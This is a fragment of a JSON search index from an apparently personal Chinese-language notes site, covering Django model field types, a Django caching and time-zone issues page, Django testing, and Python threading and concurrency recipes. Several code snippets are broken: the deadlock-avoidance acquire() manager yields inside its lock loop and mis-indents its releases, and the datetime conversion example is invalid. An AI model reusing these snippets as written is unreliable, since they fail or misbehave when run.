如果允许空值，就必须允许 null 值，因为空值会被存储为 null。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-GeneicipaddressField.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-GeneicipaddressField.html"},{"title":"ImageField","text":"继承 FileField 的所有属性和方法，但也验证上传的对象是有效的图像: class ImageField(upload_to=None, height_field=None, width_field=None, max_length=100, \\*\\*options) 除了 FileField 的特殊属性外， ImageField 也有 height 和 width 属性。 为了方便查询这些属性，ImageField 有两个额外的可选参数。 ImageField.height_field 模型字段的名称，每次保存模型实例时将自动填充图像的高度。 ImageField.width_field 模型字段的名称，每次保存模型实例时将自动填充图像的宽度。 需要 Pillow 库。 ImageField 实例在数据库中创建为 varchar 列，默认最大长度为 100 个字符。与其他字段一样，你可以使用 max_length 参数改变最大长度。 该字段的默认表单部件是一个 ClearableFileInput。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-ImageField.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-ImageField.html"},{"title":"IntegerField","text":"一个整数。从 -2147483648 到 2147483647 的值在 Django 支持的所有数据库中都是安全的: class IntegerField(\\*\\*options) 它使用 MinValueValidator 和 MaxValueValidator 根据默认数据库支持的值来验证输入。 当 localize 为 False 时是 NumberInput 否则，该字段的默认表单部件是 TextInput。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Integerfield.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Integerfield.html"},{"title":"JSONField","text":"New in Django 3.1. 一个用于存储 JSON 编码数据的字段。在 Python 中，数据以其 Python 本地格式表示：字典、列表、字符串、数字、布尔值和 None: class JSONField(encoder=None, decoder=None, **options) JSONField 在 MariaDB 10.2.7+、MySQL 5.7.8+、Oracle、PostgreSQL 和 SQLite（在 JSON1 扩展被启用的情况下）都支持。 JSONField.encoder 一个可选的 json.JSONEncoder 子类，用于序列化标准 JSON 序列化器不支持的数据类型（例如 datetime.datetime 或 UUID ）。例如，你可以使用 DjangoJSONEncoder 类。 默认为 json.JSONEncoder。 JSONField.decoder 一个可选的 json.JSONDecoder 子类，用于反序列化从数据库中获取的值。\n该值将采用自定义编码器选择的格式（通常是字符串）。\n你的反序列化可能需要考虑到你无法确定输入类型的事实。\n例如，你有可能返回一个 datetime，实际上是一个字符串，而这个字符串恰好与 datetime 选择的格式相同。 默认为 json.JSONDecoder。 如果你给字段一个 default，确保它是一个不可变的对象，\n比如 str，或者是一个每次返回一个新的可变对象的可调用对象，\n比如 dict 或一个函数。提供一个像 default={} 或 default=[] 这样的可改变的默认对象，在所有模型实例之间共享一个对象。 要在数据库中查询 JSONField，请看 查询 JSONField。 索引 Index 和 Field.db_index 都创建了一个 B 树索引，在查询 JSONField 的时候并不是特别有用。仅在 PostgreSQL 上，可以使用 GinIndex 比较适合。 PostgreSQL 用户 PostgreSQL 有两种基于 JSON 的原生数据类型： json 和 jsonb。json 和 jsonb。\n它们之间的主要区别在于它们的存储方式和查询方式。\nPostgreSQL 的 json 字段是作为 JSON 的原始字符串表示来存储的，当根据键来查询时，必须同时进行解码。\njsonb 字段是基于 JSON 的实际结构存储的，它允许索引。这样做的代价是在写入 jsonb 字段时增加了一点成本。JSONField 使用 jsonb。 Oracle 用户 Oracle 数据库不支持存储 JSON 标量值。只支持 JSON 对象和数组（在 Python 中使用 dict 和 list 表示)。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Jsonfield.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Jsonfield.html"},{"title":"NullBooleanField","text":"就像 BooleanField 的 null=True: class NullBooleanField(**options) 3.1 版后已移除: NullBooleanField 已被废弃，改为 BooleanField(null=True)。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-NullBooleanfield.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-NullBooleanfield.html"},{"title":"PositiveIntegerField","text":"就像 IntegerField 一样，但必须是正值或零（ 0 ）。\n从 0 到 2147483647 的值在 Django 支持的所有数据库中都是安全的。出于向后兼容的原因，接受 0 的值: class PositiveIntegerField(**options)","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-PositiveIntegerField.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-PositiveIntegerField.html"},{"title":"PositiveBigIntegerField","text":"New in Django 3.1. 就像一个 PositiveIntegerField，但只允许在某一特定点下的值（依赖于数据库）。\n0 到 9223372036854775807 的值在 Django 支持的所有数据库中都是安全的: class PositiveBigIntegerField(**options)","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Positivebigintegerfield.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Positivebigintegerfield.html"},{"title":"PositiveSmallIntegerField","text":"就像一个 PositiveIntegerField，但只允许在某一特定（数据库依赖的）点下取值。0 到 32767 的值在 Django 支持的所有数据库中都是安全的: class PositiveSmallIntegerField(**options)","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-PositivesmallintegerField.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-PositivesmallintegerField.html"},{"title":"SlugField","text":"Slug 是一个报纸术语。slug 是一个简短的标签，只包含字母、数字、下划线或连字符。它们一般用于 URL 中: class SlugField(max_length=50, **options) 像 CharField 一样，你可以指定 max_length （也请阅读那一节中关于数据库可移植性和 max_length 的说明）。\n如果没有指定 max_length，Django 将使用默认长度 50。 意味着将 Field.db_index 设置为 True。 基于其他值的值自动预填充一个 SlugField 通常是很有用的。 你可以在管理中使用 prepopulated_fields 来自动完成。 它使用 validate_slug 或 validate_unicode_slug 进行验证。 SlugField.allow_unicode 如果是 True，该字段除了接受 ASCII 字母外，还接受 Unicode 字母。默认值为 False。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Slugfield.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Slugfield.html"},{"title":"SmallAutoField","text":"就像一个 AutoField，但只允许值在一定（依赖于数据库）的限制下。1 到 32767 的值在 Django 支持的所有数据库中都是安全的: class SmallAutoField(**options)","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Smallautofield.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Smallautofield.html"},{"title":"SmallIntegerField","text":"就像一个 IntegerField，但只允许在某一特定（依赖于数据库的）点下取值。从 -32768 到 32767 的值在 Django 支持的所有数据库中都是安全的: class SmallIntegerField(**options)","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Smallintegerfield.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Smallintegerfield.html"},{"title":"TextField","text":"一个大的文本字段。该字段的默认表单部件是一个 Textarea: class TextField(**options) 如果你指定了 max_length 属性，它将反映在自动生成的表单字段的 Textarea 部件中。\n但是，它并没有在模型或数据库层面被强制执行。使用一个 CharField 来实现。 TextField.db_collation New in Django 3.2. 该字段的数据库字符序名称。 注解 字符序名称是不标准化的。因此，这将无法在多个数据库后端之间进行移植。 Oracle Oracle 不支持 TextField 的字符序。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Textfield.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Textfield.html"},{"title":"TimeField","text":"一个时间，在 Python 中用 datetime.time 实例表示。接受与 DateField 相同的自动填充选项: class TimeField(auto_now=False, auto_now_add=False, **options) 该字段默认的表单部件t是一个 TimeInput。管理中添加了一些 JavaScript 快捷方式。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Timefield.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Timefield.html"},{"title":"URLField","text":"URL 的 CharField，由 URLValidator 验证: class URLField(max_length=200, **options) 该字段的默认表单部件是一个 URLInput。 像所有的 CharField 子类一样， URLField 接受可选的 max_length 参数。如果你没有指定 max_length 参数，则使用默认的 200。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Urlfield.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Urlfield.html"},{"title":"UUIDField","text":"一个用于存储通用唯一标识符的字段。使用 Python 的 UUID 类。当在 PostgreSQL 上使用时，它存储在一个 uuid 的数据类型中，否则存储在一个 char(32) 中: class UUIDField(**options) 通用唯一标识符是 primary_key 的 AutoField 的一个很好的替代方案。数据库不会为你生成 UUID，所以建议使用 default import uuid\nfrom django.db import models\n\nclass MyUUIDModel(models.Model):\n    id = models.UUIDField(primary_key=True, default=uuid.uuid4, editable=False)\n    # other fields 请注意，一个可调用对象（省略括号）被传递给 default，而不是 UUID 的实例。 在 PostgreSQL 上查找 在 PostgreSQL 上使用 iexact、contains、icontains、startswith、istartswith、endswith 或 iendswith 在 PostgreSQL\n上查找没有连字符的值是行不通的，因为 PostgreSQL 将它们存储在一个连字符的 uuid 数据类型中。","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Uuidfield.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-Supported-Field-Uuidfield.html"},{"title":"问题总结","text":"缓存模块的问题 使用的 LocMemCache 是不能作同步缓存的 注意每个进程都有自己的私有缓存实例，这意味着不可能有跨进程缓存 所以说, LocMemCache是不能用来做同步缓存的! 请使用别的任意Cache! 可以参考以下链接使用其他的缓存 参考:: 震惊！Django缓存中的数据频频丢失，究竟谁是幕后黑手 使用其他的缓存 Django项目如何配置Memcached和Redis缓存?哪个更好? Redis和Memcache的区别分析 时间格式转换 如: # django 数据库查询 2021-07-30T02:46:00.Z 格式日期转换\n\n# 末日数据库格式查询结果\na = datetime.datetime('2021-07-30T02:46:00.Z')\n\nTIME_ZONE = 'Asia/Shanghai'\nTZ_SHANGHAI = pytz.timezone(TIME_ZONE)\n\n# 转换\na.astimezone(TZ_SHANGHAI).strftime('%Y-%m-%d %H:%M:%S')","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-conclusion-of-issue.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-conclusion-of-issue.html"},{"title":"测试","text":"一份好的业务代码，是需要经过实际测试的。 一方面是自己确认代码运行正常，另一方面是对外提供测试信息。 编写方法 一般来说，Django的测试用例应该定义在应用的 tests.py 文件里。 系统会自动在以 tests 开头的文件里寻找并执行测试代码。 比如有一个 polls 的django应用，将以下代码写入 tests.py: import datetime\n\nfrom django.test import TestCase\nfrom django.utils import timezone\n\nfrom .models import Question\n\n\nclass QuestionModelTests(TestCase):\n\n    def test_was_published_recently_with_future_question(self):\n        \"\"\"\n        was_published_recently() returns False for questions whose pub_date\n        is in the future.\n        \"\"\"\n        time = timezone.now() + datetime.timedelta(days=30)\n        future_question = Question(pub_date=time)\n        self.assertIs(future_question.was_published_recently(), False) 解读： 创建一个 django.test.TestCase 的子类，并添加一个方法，\n此方法创建一个 pub_date 时未来某天的 Question 实例。\n然后检查它的 was_published_recently() 方法的返回值——它 应该 是 False。 运行测试 在终端中，我们通过输入以下代码运行测试: $ python manage.py test polls 你将会看到运行结果: Creating test database for alias 'default'...\nSystem check identified no issues (0 silenced).\nF\n======================================================================\nFAIL: test_was_published_recently_with_future_question (polls.tests.QuestionModelTests)\n----------------------------------------------------------------------\nTraceback (most recent call last):\n  File \"/path/to/mysite/polls/tests.py\", line 16, in test_was_published_recently_with_future_question\n    self.assertIs(future_question.was_published_recently(), False)\nAssertionError: True is not False\n\n----------------------------------------------------------------------\nRan 1 test in 0.001s\n\nFAILED (failures=1)\nDestroying test database for alias 'default'... 以下是自动化测试的运行过程： python manage.py test polls 将会寻找 polls 应用里的测试代码 它找到了 django.test.TestCase 的一个子类 它创建一个特殊的数据库供测试使用 它在类中寻找测试方法——以 test 开头的方法。 在 test_was_published_recently_with_future_question 方法中，它创建了一个 pub_date 值为 30 天后的 Question 实例。 接着使用 assertls() 方法，发现 was_published_recently() 返回了 True ，而我们期望它返回 False 。 测试系统通知我们哪些测试样例失败了，和造成测试失败的代码所在的行号。 参考: 自动化测试简介","tags":"后端; python","url":"/yq-docs-rear-end-python-Web-framework-Django-test.html","loc":"/yq-docs-rear-end-python-Web-framework-Django-test.html"},{"title":"并发编程","text":"对于并发编程, Python 有多种长期支持的方法, 包括多线程, 调用子进程, 以及各种\n各样的关于生成器函数的技巧. 这一章将会给出并发编程各种方面的技巧, 包括通用的\n多线程技术以及并行计算的实现方法 启动与停止线程 问题 你要为需要并发执行的代码创建/销毁线程 解决方案 threading 库可以在单独的线程中执行任何的在 Python 中可以调用的对象。你可\n以创建一个 Thread 对象并将你要执行的对象以 target 参数的形式提供给该对象。 例子: def countdown(n): ...\n\nfrom threading import Thread\nt = Thread(target=countdown, args=(10,))\nt.start() 当你创建好一个线程对象后，该对象并不会立即执行，除非你调用它的 start()\n方法（当你调用 start() 方法时，它会调用你传递进来的函数，并把你传递进来的参\n数传递给该函数）。Python 中的线程会在一个单独的系统级线程中执行（比如说一个\nPOSIX 线程或者一个 Windows 线程），这些线程将由操作系统来全权管理。线程一旦\n启动，将独立执行直到目标函数返回。 也可以将一个线程加入到当前线程，并等待它终止: t.join() Python 解释器直到所有线程都终止前仍保持运行。对于需要长时间运行的线程或\n者需要一直运行的后台任务，你应当考虑使用后台线程: t = Thread(target=countdown, args=(10,), daemon=True)\nt.start() 后台线程无法等待，不过，这些线程会在主线程终止时自动销毁。除了如上所示的\n两个操作，并没有太多可以对线程做的事情。你无法结束一个线程，无法给它发送信\n号，无法调整它的调度，也无法执行其他高级操作。如果需要这些特性，你需要自己添\n加。比如说，如果你需要终止线程，那么这个线程必须通过编程在某个特定点轮询来退\n出。你可以像下边这样把线程放入一个类中: class CountdownTask:\n  def __init__(self):\n    self._running = True\n\n  def terminate(self):\n    self._running = False\n\n  def run(self, n):\n    while self._running and n > 0:\n      print('T-minus', n)\n      n -= 1\n      time.sleep(5)\n\nc = CountdownTask()\nt = Thread(target=c.run, args=(10,))\nt.start()\nc.terminate() # Signal termination\nt.join() # Wait for actual termination (if needed) 如果线程执行一些像 I/O 这样的阻塞操作，那么通过轮询来终止线程将使得线程\n之间的协调变得非常棘手。比如，如果一个线程一直阻塞在一个 I/O 操作上，它就永\n远无法返回，也就无法检查自己是否已经被结束了。要正确处理这些问题，你需要利用\n超时循环来小心操作线程: def run(self, sock):\n  # sock is a socket\n  sock.settimeout(5) # Set timeout period\n  while self._running:\n    # Perform a blocking I/O operation w/ timeout\n    try:\n      data = sock.recv(8192)\n      break\n    except socket.timeout:\n      continue\n  return 讨论 由于全局解释锁（GIL）的原因，Python 的线程被限制到同一时刻只允许一个线\n程执行这样一个执行模型。所以，Python 的线程更适用于处理 I/O 和其他需要并发执\n行的阻塞操作（比如等待 I/O、等待从数据库获取数据等等），而不是需要多处理器并\n行的计算密集型任务。 判断线程是否已经启动 问题 你已经启动了一个线程，但是你想知道它是不是真的已经开始运行了。 解决方案 线程的一个关键特性是每个线程都是独立运行且状态不可预测。如果程序中的其\n他线程需要通过判断某个线程的状态来确定自己下一步的操作，这时线程同步问题就\n会变得非常棘手。为了解决这些问题，我们需要使用 threading 库中的 Event 对象。\nEvent 对象包含一个可由线程设置的信号标志，它允许线程等待某些事件的发生。在初\n始情况下，event 对象中的信号标志被设置为假。如果有线程等待一个 event 对象，而\n这个 event 对象的标志为假，那么这个线程将会被一直阻塞直至该标志为真。一个线程\n如果将一个 event 对象的信号标志设置为真，它将唤醒所有等待这个 event 对象的线\n程。如果一个线程等待一个已经被设置为真的 event 对象，那么它将忽略这个事件，继\n续执行。下边的代码展示了如何使用 Event 来协调线程的启动: from threading import Thread, Event\nimport time\n\n# Code to execute in an independent thread\ndef countdown(n, started_evt):\n  print('countdown starting')\n  started_evt.set()\n  while n > 0:\n    print('T-minus', n)\n    n -= 1\n    time.sleep(5)\n\n# Create the event object that will be used to signal startup\nstarted_evt = Event()\n\n# Launch the thread and pass the startup event\nprint('Launching countdown') t = Thread(target=countdown, args=(10,started_evt))\nt.start()\n\n# Wait for the thread to start\nstarted_evt.wait()\nprint('countdown is running') 当你执行这段代码，\"countdown is running\"总是显示在\"countdown starting\"之\n后显示。这是由于使用 event 来协调线程，使得主线程要等到 countdown() 函数输出\n启动信息后，才能继续执行 讨论 event 对象最好单次使用，就是说，你创建一个 event 对象，让某个线程等待这个\n对象，一旦这个对象被设置为真，你就应该丢弃它。尽管可以通过 clear() 方法来重\n置 event 对象，但是很难确保安全地清理 event 对象并对它重新赋值。很可能会发生错\n过事件、死锁或者其他问题（特别是，你无法保证重置 event 对象的代码会在线程再次\n等待这个 event 对象之前执行）。如果一个线程需要不停地重复使用 event 对象，你最\n好使用 Condition 对象来代替。 Condition直接使用with即可, 使用notify唤醒其他线程. event 对象的一个重要特点是当它被设置为真时会唤醒所有等待它的线程。如果你\n只想唤醒单个线程，最好是使用信号量或者 Condition 对象来替代。 信号量Semaphore使用acquire和release 编写涉及到大量的线程间同步问题的代码会让你痛不欲生。比较合适的方式是使\n用队列来进行线程间通信或者每个把线程当作一个 Actor，利用 Actor 模型来控制并\n发。 线程间通信 问题 你的程序中有多个线程，你需要在这些线程之间安全地交换信息或数据 解决方案 从一个线程向另一个线程发送数据最安全的方式可能就是使用 queue 库中的队列\n了。创建一个被多个线程共享的 Queue 对象，这些线程通过使用 put() 和 get() 操作\n来向队列中添加或者删除元素。 Queue 对象已经包含了必要的锁，所以你可以通过它在多个线程间多安全地共享数\n据。当使用队列时，协调生产者和消费者的关闭问题可能会有一些麻烦。一个通用的解\n决方法是在队列中放置一个特殊的值，当消费者读到这个值的时候，终止执行。 有一个特殊的地方：消费者在读到这个特殊值之后立即又把它放回到队列\n中，将之传递下去。这样，所有监听这个队列的消费者线程就可以全部关闭了。尽管队\n列是最常见的线程间通信机制，但是仍然可以自己通过创建自己的数据结构并添加所\n需的锁和同步机制来实现线程间通信。最常见的方法是使用 Condition 变量来包装你\n的数据结构。 使用队列来进行线程间通信是一个单向、不确定的过程。通常情况下，你没有办法\n知道接收数据的线程是什么时候接收到的数据并开始工作的。不过队列对象提供一些\n基本完成的特性，比如下边这个例子中的 task_done() 和 join() # A thread that consumes data\ndef consumer(in_q):\n  while True:\n    # Get some data\n    data = in_q.get()\n    # Process the data\n    ...\n    # Indicate completion\n    in_q.task_done()\n\nq = Queue()\nt1 = Thread(target=consumer, args=(q,))\n# Wait for all produced items to be consumed\nq.join() 如果一个线程需要在一个\"消费者\"线程处理完特定的数据项时立即得到通知，\n你可以把要发送的数据和一个 Event 放到一起使用，这样\"生产者\"就可以通过这个\nEvent 对象来监测处理的过程了: # Make an (data, event) pair and hand it to the consumer\nevt = Event()\nout_q.put((data, evt))\n...\n# Wait for the consumer to process the item\nevt.wait() 讨论 基于简单队列编写多线程程序在多数情况下是一个比较明智的选择。从线程安全\n队列的底层实现来看，你无需在你的代码中使用锁和其他底层的同步机制，这些只会把\n你的程序弄得乱七八糟。此外，使用队列这种基于消息的通信机制可以被扩展到更大的\n应用范畴，比如，你可以把你的程序放入多个进程甚至是分布式系统而无需改变底层的\n队列结构。使用线程队列有一个要注意的问题是，向队列中添加数据项时并不会复制此\n数据项，线程间通信实际上是在线程间传递对象引用。如果你担心对象的共享状态，那\n你最好只传递不可修改的数据结构（如：整型、字符串或者元组）或者一个对象的深拷\n贝。 Queue 对象提供一些在当前上下文很有用的附加特性。比如在创建 Queue 对象时\n提供可选的 size 参数来限制可以添加到队列中的元素数量。对于\"生产者\"与\"消费\n者\"速度有差异的情况，为队列中的元素数量添加上限是有意义的。比如，一个\"生产\n者\"产生项目的速度比\"消费者\"\"消费\"的速度快，那么使用固定大小的队列就可以\n在队列已满的时候阻塞队列，以免未预期的连锁效应扩散整个程序造成死锁或者程序\n运行失常。在通信的线程之间进行\"流量控制\"是一个看起来容易实现起来困难的问\n题。如果你发现自己曾经试图通过摆弄队列大小来解决一个问题，这也许就标志着你的\n程序可能存在脆弱设计或者固有的可伸缩问题。get() 和 put() 方法都支持非阻塞方\n式和设定超时，: import queue\nq = queue.Queue()\ndata = q.get(block=False)\ndata = q.get(timeout=5.0) get时为空或者超时没获取到是就是queue.Empty异常, put但是满了就是queue.Full异常. 最后，有 q.qsize() ，q.full() ，q.empty() 等实用方法可以获取一个队列的当前\n大小和状态。但要注意，这些方法都不是线程安全的。可能你对一个队列使用 empty()\n判断出这个队列为空，但同时另外一个线程可能已经向这个队列中插入一个数据项。所\n以，你最好不要在你的代码中使用这些方法。 给关键部分加锁 问题 你需要对多线程程序中的临界区加锁以避免竞争条件。 解决方案 要在多线程程序中安全使用可变对象，你需要使用 threading 库中的 Lock 对象 Lock 对象和 with 语句块一起使用可以保证互斥执行，就是每次只有一个线程可\n以执行 with 语句包含的代码块。with 语句会在这个代码块执行前自动获取锁，在执行\n结束后自动释放锁。 讨论 线程调度本质上是不确定的，因此，在多线程程序中错误地使用锁机制可能会导致\n随机数据损坏或者其他的异常行为，我们称之为竞争条件。为了避免竞争条件，最好只\n在临界区（对临界资源进行操作的那部分代码）使用锁。在一些\"老的\"Python 代码\n中，显式获取和释放锁是很常见的: self._value_lock = threading.Lock()\nself._value_lock.acquire()\nself._value += delta\nself._value_lock.release() 相比于这种显式调用的方法，with 语句更加优雅，也更不容易出错，特别是程序员\n可能会忘记调用 release() 方法或者程序在获得锁之后产生异常这两种情况（使用 with\n语句可以保证在这两种情况下仍能正确释放锁）。 为了避免出现死锁的情况，使用锁机\n制的程序应该设定为每个线程一次只允许获取一个锁。如果不能这样做的话，你就需\n要更高级的死锁避免机制. 在 threading 库中还提供了其他的\n同步原语，比如 RLock 和 Semaphore 对象。但是根据以往经验，这些原语是用于一些\n特殊的情况，如果你只是需要简单地对可变对象进行锁定，那就不应该使用它们。一个\nRLock （可重入锁）可以被同一个线程多次获取，主要用来实现基于监测对象模式的锁\n定和同步。在使用这种锁的情况下，当锁被持有时，只有一个线程可以使用完整的函数\n或者类中的方法。 一个类级RLOCK锁可以保证一次\n只有一个线程可以调用这个类方法。不过，与一个标准的锁不同的是，已经持有这个锁\n的方法在调用同样使用这个锁的方法时，无需再次获取锁。(与以前看到的好像有点不一样,\n以前的理解是每次递归都会加一次锁, 加了多少次就需要释放多少次) 尽管你可以在程序中像标准锁一样使用信号量来做线程同步，但是这种方式并不被\n推荐，因为使用信号量为程序增加的复杂性会影响程序性能。相对于简单地作为锁使\n用，信号量更适用于那些需要在线程之间引入信号或者限制的程序。比如，你需要限制\n一段代码的并发访问量 防止死锁的加锁机制 问题 你正在写一个多线程程序，其中线程需要一次获取多个锁，此时如何避免死锁问\n题。 解决方案 在多线程程序中，死锁问题很大一部分是由于线程同时获取多个锁造成的。举个例\n子：一个线程获取了第一个锁，然后在获取第二个锁的时候发生阻塞，那么这个线程就\n可能阻塞其他线程的执行，从而导致整个程序假死。解决死锁问题的一种方案是为程序\n中的每一个锁分配一个唯一的 id，然后只允许按照升序规则来使用多个锁，这个规则\n使用上下文管理器是非常容易实现的: import threading\nfrom contextlib import contextmanager\n\n# Thread-local state to stored information on locks already acquired\n_local = threading.local()\n\n@contextmanager\ndef acquire(*locks):\n  # Sort locks by object identifier\n  locks = sorted(locks, key=lambda x: id(x))\n\n  # Make sure lock order of previously acquired locks is not violated\n  acquired = getattr(_local,'acquired',[])\n  if acquired and max(id(lock) for lock in acquired) >= id(locks[0]):\n    raise RuntimeError('Lock Order Violation')\n  # Acquire all of the locks\n  acquired.extend(locks)\n  _local.acquired = acquired\n\n  try:\n    for lock in locks:\n      lock.acquire()\n      yield\n  finally:\n    # Release locks in reverse order of acquisition\n    for lock in reversed(locks):\n    lock.release()\n    del acquired[-len(locks):] 如何使用这个上下文管理器呢？你可以按照正常途径创建一个锁对象，但不论是\n单个锁还是多个锁中都使用 acquire() 函数来申请锁，示例如下: import threading\nx_lock = threading.Lock()\ny_lock = threading.Lock()\n\ndef thread_1():\n  while True:\n    with acquire(x_lock, y_lock):\n      print('Thread-1')\n\ndef thread_2():\n  while True:\n    with acquire(y_lock, x_lock):\n    print('Thread-2')\n\nt1 = threading.Thread(target=thread_1)\nt1.daemon = True\nt1.start()\n\nt2 = threading.Thread(target=thread_2)\nt2.daemon = True\nt2.start() 如果你执行这段代码，你会发现它即使在不同的函数中以不同的顺序获取锁也没\n有发生死锁。其关键在于，在第一段代码中，我们对这些锁进行了排序。通过排序，使\n得不管用户以什么样的顺序来请求锁，这些锁都会按照固定的顺序被获取。如果有多个\nacquire() 操作被嵌套调用，可以通过线程本地存储（TLS）来检测潜在的死锁问题。 讨论 死锁是每一个多线程程序都会面临的一个问题（就像它是每一本操作系统课本的\n共同话题一样）。根据经验来讲，尽可能保证每一个线程只能同时保持一个锁，这样程\n序就不会被死锁问题所困扰。一旦有线程同时申请多个锁，一切就不可预料了。\n死锁的检测与恢复是一个几乎没有优雅的解决方案的扩展话题。一个比较常用的\n死锁检测与恢复的方案是引入看门狗计数器。当线程正常运行的时候会每隔一段时间\n重置计数器，在没有发生死锁的情况下，一切都正常进行。一旦发生死锁，由于无法重\n置计数器导致定时器超时，这时程序会通过重启自身恢复到正常状态。 避免死锁是另外一种解决死锁问题的方式，在进程获取锁的时候会严格按照对象\nid 升序排列获取，经过数学证明，这样保证程序不会进入死锁状态。\n避免死锁的主要思想是，单纯地按照对象 id 递增的顺序加锁不会产生循环\n依赖，而循环依赖是死锁的一个必要条件，从而避免程序进入死锁状态。 保存线程的状态信息 问题 你需要保存正在运行线程的状态，这个状态对于其他的线程是不可见的。 解决方案 有时在多线程编程中，你需要只保存当前运行线程的状态。要这么做，可使用\nthread.local() 创建一个本地线程存储对象。对这个对象的属性的保存和读取操作都\n只会对执行线程可见，而其他线程并不可见。 讨论 在大部分程序中创建和操作线程特定状态并不会有什么问题。不过，当出了问题的\n时候，通常是因为某个对象被多个线程使用到，用来操作一些专用的系统资源，比如一\n个套接字或文件。你不能让所有线程贡献一个单独对象，因为多个线程同时读和写的时\n候会产生混乱。本地线程存储通过让这些资源只能在被使用的线程中可见来解决这个\n问题。 每个 threading.local() 实例为每个线程维护着一个单独的实例字典。\n所有普通实例操作比如获取、修改和删除值仅仅操作这个字典。每个线程使用一个独立\n的字典就可以保证数据的隔离了 创建一个线程池 问题 你创建一个工作者线程池，用来相应客户端请求或执行其他的工作。 解决方案 concurrent.futures 函数库有一个 ThreadPoolExecutor 类可以被用来完成这个\n任务。 如果你想手动创建你自己的线程池，通常可以使用一个 Queue 来轻松实现. 但使用 ThreadPoolExecutor 相对于手动实现的一个好处在于它使得任务提交者更\n方便的从被调用函数中获取返回值。 注意a.result() 操作会阻塞进程直到对应的函数执行完成并返回一个结果。 讨论 通常来讲，你应该避免编写线程数量可以无限制增长的程序.\n以抵御有人试图通过创建大量线程让你服务器资\n源枯竭而崩溃的攻击行为。通过使用预先初始化的线程池，你可以设置同时运行线程的\n上限数量。 你可能会关心创建大量线程会有什么后果。现代操作系统可以很轻松的创建几千\n个线程的线程池。甚至，同时几千个线程等待工作并不会对其他代码产生性能影响。当\n然了，如果所有线程同时被唤醒并立即在 CPU 上执行，那就不同了——特别是有了全\n局解释器锁 GIL。通常，你应该只在 I/O 处理相关代码中使用线程池。 创建大的线程池的一个可能需要关注的问题是内存的使用。例如，如果你在 OS X\n系统上面创建 2000 个线程，系统显示 Python 进程使用了超过 9GB 的虚拟内存。不\n过，这个计算通常是有误差的。当创建一个线程时，操作系统会预留一个虚拟内存区域\n来放置线程的执行栈（通常是 8MB 大小）。但是这个内存只有一小片段被实际映射到\n真实内存中。因此，Python 进程使用到的真实内存其实很小（比如，对于 2000 个线程\n来讲，只使用到了 70MB 的真实内存，而不是 9GB）。如果你担心虚拟内存大小，可以\n使用 threading.stack_size() 函数来降低它: import threading\nthreading.stack_size(65536) 如果你加上这条语句并再次运行前面的创建 2000 个线程试验，你会发现 Python\n进程只使用到了大概 210MB 的虚拟内存，而真实内存使用量没有变。注意线程栈大小\n必须至少为 32768 字节，通常是系统内存页大小（4096、8192 等）的整数倍。 简单的并行编程 问题 你有个程序要执行 CPU 密集型工作，你想让他利用多核 CPU 的优势来运行的快\n一点。 解决方案 concurrent.futures 库提供了一个 ProcessPoolExecutor 类，可被用来在一个单\n独的 Python 解释器中执行计算密集型函数。不过，要使用它，你首先要有一些计算密\n集型的任务。 讨论 ProcessPoolExecutor 的典型用法如下: from concurrent.futures import ProcessPoolExecutor\n  with ProcessPoolExecutor() as pool:\n  ...\n  do work in parallel using pool\n  ... 其原理是，一个 ProcessPoolExecutor 创建 N 个独立的 Python 解释器，N 是系\n统上面可用 CPU 的个数。你可以通过提供可选参数给 ProcessPoolExecutor(N) 来修\n改处理器数量。这个处理池会一直运行到 with 块中最后一个语句执行完成，然后处理\n池被关闭。不过，程序会一直等待直到所有提交的工作被处理完成。 被提交到池中的工作必须被定义为一个函数。有两种方法去提交。如果你想让一个\n列表推导或一个 map() 操作并行执行的话，可使用 pool.map() 另外，你可以使用 pool.submit() 来手动的提交单个任务 如果你手动提交一个任务，结果是一个 Future 实例。要获取最终结果，你需要调\n用它的 result() 方法。它会阻塞进程直到结果被返回来。\n如果不想阻塞，你还可以使用一个回调函数: def when_done(r): print('Got:', r.result())\n\nfuture_result = pool.submit(work, arg)\nfuture_result.add_done_callback(when_done) 回调函数接受一个 Future 实例，被用来获取最终的结果（比如通过调用它的\nresult() 方法）。尽管处理池很容易使用，在设计大程序的时候还是有很多需要注意的\n地方，如下几点： · 这种并行处理技术只适用于那些可以被分解为互相独立部分的问题。\n· 